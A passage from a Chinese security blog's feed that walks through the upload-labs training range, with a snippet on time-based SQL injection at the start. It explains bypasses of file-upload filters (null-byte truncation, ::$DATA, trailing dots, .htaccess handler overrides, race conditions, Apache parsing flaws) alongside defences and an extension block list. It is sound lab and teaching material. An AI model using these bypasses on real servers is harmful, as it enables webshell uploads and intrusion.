be used, chances are good that system administrators realize something is going on.<br>Another thing to consider is the length of the delay you inject. This is especially important when testing Web applications. The server load and the network speed may have a huge impact on the response time. You need to pause the query long enough to make sure these uncertain factors do not falsify your results. On the other hand, you want the delay to be short enough to test the application in a reasonable time. This becomes particularly difficult when no exact delay can be injected.</p><blockquote><p><a href="http://www.sqlinjection.net/time-based/">http://www.sqlinjection.net/time-based/</a></p></blockquote></blockquote><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>感谢Mads师傅的文章进而引发了我这一系列的爆炸性学习！<a href="https://xz.aliyun.com/t/4914">传送门</a></p>]]></content>
    
    
    <categories>
      
      <category>技术点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>靶场</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-lab靶场通关记录</title>
    <link href="/2019/05/14/%5Bold%5Dupload-lab%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/"/>
    <url>/2019/05/14/%5Bold%5Dupload-lab%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/</url>
    
    <content type="html"><![CDATA[<p>由于个人时间原因，只能说算是每一关自己都打过吧，但是延伸的不太深，等日后再来填坑系列</p><h1 id="友情提示！"><a href="#友情提示！" class="headerlink" title="友情提示！"></a>友情提示！</h1><p>环境：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a><br><img src="https://github.com/c0ny1/upload-labs/raw/master/doc/mind-map.png"></p><h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>这种是在本地进行，通过客户端的JS函数进行判别。所以你上传一个文件之后，不用与服务器进行交互，本地客户端可以立刻给你返回你的正确与否</p><blockquote><p>可以根据返回时间来判断</p></blockquote><h2 id="lab1之本地js函数"><a href="#lab1之本地js函数" class="headerlink" title="lab1之本地js函数"></a>lab1之本地js函数</h2><p>禁用函数/f12即可</p><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="lab2之Content-Type"><a href="#lab2之Content-Type" class="headerlink" title="lab2之Content-Type"></a>lab2之Content-Type</h2><p>修改上传包的Content-Type即可</p><h2 id="lab3之上传特殊可解析后缀"><a href="#lab3之上传特殊可解析后缀" class="headerlink" title="lab3之上传特殊可解析后缀"></a>lab3之上传特殊可解析后缀</h2><p><strong>源码</strong></p><blockquote><p>$deny_ext = array(‘.asp’,’.aspx’,’.php’,’.jsp’);</p></blockquote><p><strong>防护之道</strong></p><blockquote><p>$deny_ext = array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess”);</p></blockquote><h2 id="lab5之文件名大小写绕过"><a href="#lab5之文件名大小写绕过" class="headerlink" title="lab5之文件名大小写绕过"></a>lab5之文件名大小写绕过</h2><p><strong>防护之道</strong></p><blockquote><p><code>$file_ext = strtolower($file_ext);</code> //转换为小写</p></blockquote><h2 id="lab6之空格截断"><a href="#lab6之空格截断" class="headerlink" title="lab6之空格截断"></a>lab6之空格截断</h2><p><strong>原理</strong><br>先绕过黑名单，再利用window特性在保存对应文件时候会去除文件名结尾的空格<br><strong>防护之道</strong><br><code>$file_ext = trim($file_ext);</code> //首尾去空</p><p><strong>实验</strong><br>7.0下可以成功上传,但是7.1下上传失败</p><blockquote><p>无论是否是nts版本,只要是7.0之前都可以利用，nginx也实验成功，而7.1之后则上传失败<br>感觉这个并不是windows特性，而是因为move_uploaded_file函数的原因，只不过在php7.0以后修复了而已<br>怀疑的原因是因为:如果仅仅是和winodw特性有关，那么这种漏洞应该和Php版本没关系，或者说与move_uploaded_file函数不相关。<br><strong>拓展</strong><br>为了实验php版本问题，所以在Ubuntu环境试验了下（我的php7.2版本）</p></blockquote><p>发现保存的时候确实有空格，因此确定不是move_uploaded_file函数的原因，就是windows特性，但是为啥window环境下低版本可以去除，后面的高版本就不行？双因素导致的？<br><strong>总结</strong><br>以下仅仅只是个人猜测（由于涉及到底层代码跟踪审计，能力以及精力暂时放弃）</p><ol><li> 首先明确，他报的错误是：上传错误，而查看代码这个报错取决于 move_upload_file函数的返回值</li><li> move_upload_file函数在处理windows和linux文件路径的时候处理方式不同，所以导致了7.1下linux可以上传，而windows上传错误</li><li> move_upload_file函数在7.1以后的版本改动了函数代码，修复了空格截断的问题，但是仅限于windows下修改了，linux下没有修复</li></ol><p><strong>补充</strong><br>对于上面Ubuntu环境下，访问php+%00以达到访问空格的效果来访问该文件</p><p>为什么没有执行，反而把文件当做注释？有病吧？<br>和P牛交流后</p><blockquote><p>浏览器行为：浏览器把他当做注释，和服务器无关</p><blockquote><p>后面在Apache解析漏洞的时候发现了原因：php%00为不可解析文件，此时就会把该文件当做默认类型进行处理了，一般来说，默认类型是text/plain。.<a href="https://blog.csdn.net/wn314/article/details/77074477">传送门</a></p></blockquote></blockquote><h2 id="lab7之加-绕过"><a href="#lab7之加-绕过" class="headerlink" title="lab7之加.绕过"></a>lab7之加.绕过</h2><p><strong>原理</strong><br>没有对后缀名进行去”.”处理，利用windows特性，，在保存对应的文件时候会自动去掉后缀名中最后的”.”<br><strong>过程</strong><br><code>$file_ext = strrchr($file_name, &#39;.&#39;);</code>通过这个函数得到尾缀，即为‘.’，从而绕过黑名单<br><strong>防护之道</strong><br><code>$file_name = deldot($file_name);</code>//删除文件名末尾的点（deldot函数要自己实现）<br><strong>注意事项</strong><br>同上，为windows特效，如我在windows下的实验如下：<br>文件保存依然带….</p><h2 id="lab8之-DATA绕过"><a href="#lab8之-DATA绕过" class="headerlink" title="lab8之:$DATA绕过"></a>lab8之:$DATA绕过</h2><p><strong>原理</strong><br>基于window特性中的NTFS协议,使得绕过黑名单，但是保存的时候又被省略<br><strong>防护之道</strong><br><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);</code>//去除字符串<code>::$DATA</code><br>记得要先去除大小写 在进行判断 不然存在<code>：：$data</code>的绕过<br><strong>拓展①</strong><br>:$data可以吗？（只有一个:）</p><p>文件名去掉尾缀:$data之后</p><p>查看生成的文件</p><p>结论：$data可以生成文件php文件，但是php文件里面没有写入内容TAT（原理别问，问就是不知道）<br><strong>拓展②</strong><br>接上面原理<a href="https://bbs.pediy.com/thread-246118.htm">传送门</a></p><blockquote><p>Test.php:a.jpg 生成Test.php 空<br><code>Test.php::$DATA</code> 生成test.php <code>&lt;?php phpinfo();?&gt;</code><br><code>Test.php::$INDEX_ALLOCATION</code> 生成test.php文件夹<br><code>Test.php::$DATA\0.jpg</code> 生成0.jpg <code>&lt;?php phpinfo();?&gt;</code><br><code>Test.php::$DATA\aaa.jpg</code> 生成aaa.jpg <code>&lt;?php phpinfo();?&gt;</code></p></blockquote><h2 id="lab10之双写绕过"><a href="#lab10之双写绕过" class="headerlink" title="lab10之双写绕过"></a>lab10之双写绕过</h2><p><strong>前言</strong><br>str_ireplace：替换字符串中的一些字符（不区分大小写）<br><strong>防护之道</strong><br>循环替换直到字符串里面没有对应字符</p><h2 id="lab4之htaccess上传"><a href="#lab4之htaccess上传" class="headerlink" title="lab4之htaccess上传"></a>lab4之htaccess上传</h2><p><strong>什么是htaccess文件</strong><br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br><strong>怎么探测</strong><br>比如 xxx.com/htaccess看是否404，403等就算存在，当然也存在一些变体：1.htaccess,dot.htaccess,_.htaccess等等<br><strong>原理</strong></p><ul><li>  htaccess容易被覆盖</li><li>  htaccess可以修改网站配置</li></ul><p><strong>过程</strong></p><ol><li><p>上传htaccess文件（通过BP修改文件名）</p><blockquote><p>SetHandler application/x-httpd-php<br> SetHandler application/x-httpd一php<br> &lt;//FilesMatch&gt;<br> 和上面的区别在于这个只识别文件名含cimer关键字的文件为php<br> AddType application/x-httpd-php.jpg：将服务器的jpg文件视为php文件</p></blockquote></li><li><p> 上传php文件，修改尾缀为jpg</p></li><li><p> 访问上传之后的jpg文件</p></li></ol><p><strong>注意事项</strong></p><ol><li> 仅针对Apache下才有这个文件，nginx几率太小除非管理员自己配置</li><li> 只有在非nts版本才可生效(php7以后默认nts版本，不过一般推荐windows下的php都是默认非nts版本，linux只有nts的版本)（还是不知道为啥nts不行TAT）</li></ol><p>5.5.38为非NTS最高版本—–可用<br>5.3.29-nts为最低的NTS版本—-不可用<br>5.3.29-nts版本无效<br>5.3.29-nts版本无效<br><strong>防护之道</strong></p><ol><li> 黑名单加上.htaccess</li><li> 文件上传目录权限设置为444，即只可读</li><li> 重命名自己的htaccess文件</li></ol><p><strong>课外拓展</strong><br><a href="https://xz.aliyun.com/t/3937">https://xz.aliyun.com/t/3937</a><br><strong>对htaccess的解释</strong><br><a href="https://www.freebuf.com/articles/web/169156.html">https://www.freebuf.com/articles/web/169156.html</a></p><h1 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h1><p>CVE-2015-2348,<a href="https://nvd.nist.gov/vuln/detail/CVE-2015-2348">传送门</a></p><blockquote><p>这次的漏洞就出现在第二个参数，这个参数代表的是上传文件移动的最终目的地址。如果$ destination变量是从用户$ _GET或$ _POST中获得的并且我们可控，那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传。<br><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html">https://www.cnblogs.com/cyjaysun/p/4390930.html</a></p></blockquote><p><strong>受影响版本</strong><br>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7</p><blockquote><p>对于版本号，个人存疑，因为我的实验环境只有在5.2下可以，5.3及以上则不行。（## lab19那里有截图，其他的就没截图了，占空间没必要）<br>smile师傅则是5.6都可以，其他师傅也是5.3-5.6可以<br>所以玄学？可能是我用的phpstudy?</p></blockquote><p><strong>防护之道</strong><br>move_uploaded_file()函数的第二个参数用户不可控即可</p><h2 id="lab11之-00截断（白名单-GET）"><a href="#lab11之-00截断（白名单-GET）" class="headerlink" title="lab11之%00截断（白名单+GET）"></a>lab11之%00截断（白名单+GET）</h2><blockquote><p>先说一下%00这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！<br>空格的ascii为32，%00表示NUL，为空的意思.%00等效于’\0’，表示了字符串的结束（’\0’的ascii也为0）也就为什么保存文件的时候，文件名发生了截断</p></blockquote><p><strong>前言</strong></p><ol><li>这里的截断和前面lab6的空格截断是不同的<ul><li>  前面的是利用黑名单绕过+Windows特性绕过（后面跟空格%20绕过黑名单+windows保存文件会忽略后面的空格）</li><li>  此处没有黑名单，他利用的php的move_file_file函数的漏洞，从而导致的保存文件的时候文件名发生了截断。</li></ul></li><li> move_upload_file会检查并确保第一个参数filename指定的文件是否是合法的上传文件（通过php的HTTP POST上传机制所上传的文件即为合法）</li></ol><p><strong>前提</strong></p><ol><li> 参考上面：php版本+move_upload_file参数可控。</li><li> php的magic_quotes_gpc为OFF状态(因为会对%00进行转义)<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708134810.png" alt="20190708134810.png"><br>二者需要同时满足，本人亲自试验过，尤其是php版本</li></ol><p><strong>防护之道</strong><br>消灭任意一个前提即可（注意gpc转义在5.4之后也被废除了貌似）<br><strong>原理(个人实验过程)：</strong></p><blockquote><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708134826.png" alt="20190708134826.png"><br>对save_path没有进行检查，只检查了上传文件名，从而可以更改save_path，./upload后面加上a.php%00。如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：uploads/a.php%00/2.jpg。由于发生截断而形成绕过，但是具体什么时候截断？怎么截断的？</p></blockquote><p><strong>什么时候截断？怎么截断的？</strong></p><blockquote><p>首先为了验证上面的想法，修改源文件，增加了几个输出项<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708134849.png" alt="20190708134849.png"><br>然后进行上传，发现php后面啥也没有，难道没有截断？<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708134858.png" alt="20190708134858.png"><br>访问文件路径upload/aaa.php�/7720190516181910.jpg的时候，发现aaa.php后面有一个不可见字符，进而访问该链接该文件不存在？？<br>删掉php后面字段之后发现可以成功访问并执行php文件，同时在我的上传目录下发现只成功保存了aaa.php文件，并没有jpg<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708134911.png" alt="20190708134911.png"></p></blockquote><p>因此我怀疑是move_upload_file这个函数的问题，导致保存文件的时候，遇到php后面的不可见字符%00，表示字符串结束而出现了截断.<br>而此处的截断是指，文件名在保存的时候发生的截断！</p><p>具体的原理可以参考这篇文章。<a href="https://blog.csdn.net/zhangzhuangtongxue/article/details/78198191">传送门</a><br><strong>补充</strong><br>借用smile师傅的一张图,可以看到此处的路径是被截断了的，前面我可能是因为echo的原因导致的忽略<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135056.png" alt="20190708135056.png"></p><h2 id="lab12之-00截断（白名单-post）"><a href="#lab12之-00截断（白名单-post）" class="headerlink" title="lab12之%00截断（白名单+post）"></a>lab12之%00截断（白名单+post）</h2><p>和前面文件上传路径URL参数里不同，此时的save_path在Bode的post里面</p><blockquote><p>前者lab11：在提交数据的时候，浏览器会对数据做一次urldecode的操作（比如汉字），而到服务端，会对数据进行一次urldecode的操作，因此如果path在非enctype=multipart/form-data的表单中或URL or Cookie中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行URL解码即可。</p></blockquote><blockquote><p>后者lab12：上传的表单中有一个enctype的属性，并且需要enctype=”multipart/form-data” (不对表单中数据进行编码)，<br>因为不进行编码，如果在表单中填写%00则直接变成实体，25 30 30，而非00。（如果直接空格 则是%20）<br>而此时的path是存放在表单中，要想实现%00截断的效果，则要修改hex。<br>表单中直接%00效果如下：<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135210.png" alt="20190708135210.png"></p></blockquote><p><strong>利用</strong><br>php后面跟个字符标记个位置，比如空格，然后直接hex找到对应位置修改20为00即可</p><blockquote><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135201.png" alt="20190708135201.png"></p></blockquote><p><strong>前提</strong><br>同lab11<br><strong>补充</strong><br>其他的文件上传网页，还有没有save_path，直接给你filename=./upload/xxxx直接给你路径，这个时候就不用（save_path=a.php%00）+（filename=2.jpg），直接./upload/a.php%00.jpg即可（当然对于post的表单中则修改hex达到%00的效果）</p><h2 id="lab19之-00截断（黑名单）"><a href="#lab19之-00截断（黑名单）" class="headerlink" title="lab19之%00截断（黑名单）"></a>lab19之%00截断（黑名单）</h2><p><strong>前言</strong><br>pathinfo:以数组的形式返回文件路径的信息</p><blockquote><p>之前：<code>$file_ext = pathinfo( $ file_name,PATHINFO_EXTENSION);</code><br>现在：<code>file_ext = strrchr($file_name, &#39;.&#39;);</code><br>之前是根据“.”的位置来判断后缀,而这里使用的是pathinfo函数</p></blockquote><p><strong>大部分师傅的解法</strong><br>1.php .jpg的方式绕过move函数</p><blockquote><p>我试验的只有5.2成功，5.4，或者5.3的Nts不行<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135300.png" alt="19%005.2成功"></p></blockquote><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135313.png" alt="19%005.3nts"></p><p><strong>另一种有意思的解法</strong><br>在文件名的结尾加上/.，比如a.php/.<br>move_uploaded_file底层会调用tsrm_realpath函数，该函数会递归删除文件名最后的/.导致php文件的上传，同样类似的函数还有file_put_content()，反正打开文件流都会有类似的操作</p><blockquote><p>当然版本还是5.2可以，5.3以及以上不行<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135432.png" alt="19-5.2成功"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135447.png" alt="19-5.3失败"></p></blockquote><p><strong>补充</strong><br>前面利用window特性：空格，加”.”，”::$DATA”，或者大小写绕过也是可以的</p><h2 id="lab20之explode的数组绕过"><a href="#lab20之explode的数组绕过" class="headerlink" title="lab20之explode的数组绕过"></a>lab20之explode的数组绕过</h2><p><strong>分析</strong></p><ol><li> 先白名单判断MIME：<code>$allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);</code></li><li> 再explode()把字符串按照指定字符打散为数组：<code>$file = explode(&#39;.&#39;, strtolower($file));</code></li><li> 然后白名单后缀<code>$ext = end($file)$allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</code></li><li> 最后把把刚刚的拆散的字符串进行拼接： <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code></li></ol><ul><li>  reset() 函数将内部指针指向数组中的第一个元素，并输出。</li></ul><p><strong>原理</strong></p><ul><li>  上传构造save_path为数组，绕过explode函数</li><li>利用索引数组，而非顺序数组，[0],[2]两个索引，因此<code>count($file)=2</code>，从而使得<code>$file[count($file) - 1]</code>为空。<ul><li>本质上save_path[2]这个索引只要是非1的任何字母或者数字都可以<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135741.png" alt="20非1即可"></li></ul></li></ul><p><strong>实验</strong><br>空格截断，“/.”，“加.”，“：：$DATA”,包括什么都不加都可以的。<br>也就是只需上传的为数组绕过即可！</p><ol><li><p> <code>：：$DATA 7.0成功，7.1失败</code><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135812.png" alt="data70"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135850.png" alt="data71失败"></p></li><li><p> /.在7.2下成功<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135923.png" alt="7.2成功"></p></li><li><p> %00 5.2成功，5.3失败<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708135946.png" alt="%0052succ"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140027.png" alt="%005.3失败"></p></li><li><p> 加. 7.2成功<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140048.png" alt="20190708140048.png"></p></li><li><p> 空格 7.2成功<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140107.png" alt="7.2空格成功"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140114.png" alt="7.2有字母的空格截断失败"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140121.png" alt="7.1有字母的空格截断成功"></p></li></ol><p><strong>补充</strong><br>数据包上传格式可能导致的问题<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140212.png" alt="20回车问题"></p><h1 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h1><p>13-15都可以直接copy 直接头文字+类型+文件名即可，16二次渲染也可以绕过，但是都要配合文件包含漏洞</p><h2 id="lab13之文件头检查"><a href="#lab13之文件头检查" class="headerlink" title="lab13之文件头检查"></a>lab13之文件头检查</h2><p>读文件前两个字节来判断文件的真实类型<br>保存文件前两个字节关键词即可</p><h2 id="lab14之getimagesize"><a href="#lab14之getimagesize" class="headerlink" title="lab14之getimagesize"></a>lab14之getimagesize</h2><p><strong>file_exist</strong>s：判断文件或者目录是否存在<br><strong>image_type_to_extension</strong>：获取图片后缀<br><strong>getimagesize</strong>：</p><ul><li>  返回一个具有四个单元的数组。索引 0 包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG。索引 3 是文本字符串，内容为“height=”yyy” width=”xxx””，可直接用于 IMG 标记。</li><li>  如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生错误。</li><li>  本函数不需要 GD 图像库。</li><li>  只是获取信息而已，并不对图像进行处理，即不进行二次渲染<h2 id="lab15之exif-imagetype"><a href="#lab15之exif-imagetype" class="headerlink" title="lab15之exif_imagetype"></a>lab15之exif_imagetype</h2>exif_imagetype：判断一个图像的类型</li><li>  如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值和 getimagesize() 返回的数组中的索引 2 的值是一样的，但本函数快得多。</li><li>  用到php_exif模块来判断文件类型<h2 id="lab16之二次渲染"><a href="#lab16之二次渲染" class="headerlink" title="lab16之二次渲染"></a>lab16之二次渲染</h2></li></ul><p><strong>观察源码</strong><br>综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染<br><strong>补充</strong><br>imagecreatefromjpeg — 由文件或 URL 创建一个新图象。成功后返回图象资源,失败后返回 FALSE 。对于返回的图像资源，可以进行大小背景色等处理。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。缩略图。<br>imagejpeg — 输出图象到浏览器或文件。成功时返回 TRUE， 或者在失败时返回 FALSE。<br><strong>分析</strong><br>很明显，从图像本身而言图片上传之后发生了很大的改变（由于imagecreatefromjpeg的API生成的原因导致的）</p><blockquote><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140347.png" alt="20190708140347.png"><br>再用winhex对比之后发现二者差距更大<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140355.png" alt="20190708140355.png"></p></blockquote><p><strong>方法</strong><br>绕过方法基于可以参考这篇文章，原理就是对比二者没有改动的部分然后进行修改。<a href="https://xz.aliyun.com/t/2657">传送门</a><br><strong>延伸</strong><br>有的图片上传之后使用GD库函数处理的，这个时候以前的方法不一定管用，可以参考我关于文件上传关于GD的文章</p><h1 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h1><h2 id="lab9之逻辑错误"><a href="#lab9之逻辑错误" class="headerlink" title="lab9之逻辑错误"></a>lab9之逻辑错误</h2><p><strong>代码层</strong></p><ul><li>  正常的防护代码：<br><code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code></li><li>  本处错误的配置：<br><code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</code></li></ul><p><strong>逻辑层</strong><br>上传文件后①文件名先去空格，再去末尾的点②取尾缀③尾缀进行点空格等过滤再判别，如果成功则以一开始的文件名上传<br>也就说一开始的文件名虽然存在问题，但是尾缀可以通过过滤，依然存在漏洞<br>构造文件名为info.php. .，去空格和末尾的点得到info.php.+空格<br>取尾缀.+空格 先去.，再去空格，尾缀只剩下”.“，即绕过，<br>此时保存文件名为info.php.+空格，又由于window特性，保存只保留info.php达到绕过<br><strong>实验</strong><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140550.png" alt="20190708140550.png"></p><p><strong>防护之道</strong><br>如果重名名了文件的话，应该会用$file_ext来进行拼凑文件，这样保存在服务器中的文件将没有后缀（.保存的时候被去除了）<br><strong>补充</strong><br>可以考虑move_uploaded_file的.漏洞绕过</p><h2 id="lab17之条件竞争（白名单）"><a href="#lab17之条件竞争（白名单）" class="headerlink" title="lab17之条件竞争（白名单）"></a>lab17之条件竞争（白名单）</h2><p><strong>原因</strong></p><ul><li>  之前都是先判断是否在白名单中，再进行move_uploaded_file进行移动<br>而在发生条件竞争的这里，先进行文件移动，在判断是否在白名单中，如果不在则销毁文件。<br>而在移动文件 到销毁文件的过程中，存在一定的时间差，如果你发包足够快，就可以访问对应的文件了</li><li>  已知上传路径：<code>$upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;</code>并没有进行重命名从而可以 访问对应的路径。（他只是在判断是在白名单之内在进行重命名的）</li></ul><p>查看源代码就会发现你需要在缓存文件转移到别的目录的时候，赶紧访问它，这里可以使用burp同时一边上传文件，一边请求对应的文件<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140645.png" alt="20190708140645.png"></p><p>除了BP，还可以采取Python脚本的形式请求！<br>文件内容除了phpinfo（),还可以考虑执行cmd命令<br><strong>防护之道</strong><br>上传文件重命名，即上传的文件名用户不可知<br>先判断是否在白名单，再进行移动</p><h2 id="lab18之条件竞争-apache解析漏洞"><a href="#lab18之条件竞争-apache解析漏洞" class="headerlink" title="lab18之条件竞争+apache解析漏洞"></a>lab18之条件竞争+apache解析漏洞</h2><p><strong>原理</strong></p><ul><li>  由于黑名单机制，才使得未知拓展名能通过</li><li>  先move在改名，因为如果先改名，在move则不存在条件竞争（如果move没移到指定目录，则tem临时目录你也未知而无法利用）</li><li>  条件竞争：你上传的文件为xxx.php.xxx的格式，比如a.php.7z。由于重命名他会改名为2134654.7z</li><li>  Apache解析漏洞：apache发现这个文件的扩展名是未知 的，那么它会先看在扩展名之前是否有其他的可识别的扩展名，也就是7z不可知，php可知，那么他就会以Php形式来识别该文<a href="https://www.cnblogs.com/milantgh/p/5116955.html">传送门</a></li></ul><p>四者缺一不可</p><p><strong>补充</strong></p><ol><li> 为什么是注释形式？<br>Apache解析到他是Php文件，但是交给php解释器去处理的时候,php解释器的解析规则和Apache不同，他会以结尾是否为php来审核，发现不可识别，没法执行，但也没有报错，而是返回了文件内容本身。</li><li> Apache适用版本？<br>Apache 2.0.x &lt;= 2.0.59<br>Apache 2.2.x &lt;= 2.2.17<br>Apache 2.2.2 &lt;= 2.2.8</li><li> 想要测试，进入php5.conf配置文件修改正则模块即可，可参看此篇文章。<a href="https://blog.csdn.net/wn314/article/details/77074477">传送门</a><br>个人实验结果如下：成功<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708140822.png" alt="20190708140822.png"></li></ol><h1 id="其他中间件"><a href="#其他中间件" class="headerlink" title="其他中间件"></a>其他中间件</h1><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><p>一、不可识别解析<br>apache解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p><p>apache版本在以下范围内<a href="https://uuzdaisuki.com/2018/05/01/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">传送门</a></p><ul><li>  Apache 2.0.x &lt;= 2.0.59<br>Apache 2.2.x &lt;= 2.2.17<br>Apache 2.2.2 &lt;= 2.2.8</li></ul><p>都可以通过上传xxx.php.rar或xxx.php+任意无法解析后缀解析为php。</p><p>经过自己的亲身实验：由于Apache是个服务器，他会调用Apache目录下对应解析php配置文件，去解析php文件。可能就是上述Apache版本下的php解析文件存在问题，也就是正则匹配这一块存在解析漏洞导致了这个问题的发生，而后续的版本可能修复了<br>比如我自己的Apache2.4版本，修改了下对应的正则规则即可复现<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708141000.png" alt="20190708141000.png"></p><blockquote><p>大佬的总结：网上说的“低版本的apache存在未知扩展名解析漏洞”的说法是错误的，正确的说法应该是使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。并且，想利用此漏洞必须保证文件扩展名中 至少带有一个“.php”，否则将默认被作为txt/html文档处理。</p></blockquote><p>二、配置问题</p><ol><li> 如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。</li><li> 如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。<br>这个漏洞与Apache、php版本无关，属于用户配置不当造成的解析漏洞</li></ol><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p><a href="https://www.cnblogs.com/pureqh/p/10243402.html">https://www.cnblogs.com/pureqh/p/10243402.html</a></p><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a><br>IIS和nginx就这样</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190708141052.png" alt="20190708141052.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>upload-labs里面的关卡个人感觉只是针对文件上传这个漏洞去弄的，可以梳理一下，可以根据上面的绕过写一个fuzz字典XD</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p><a 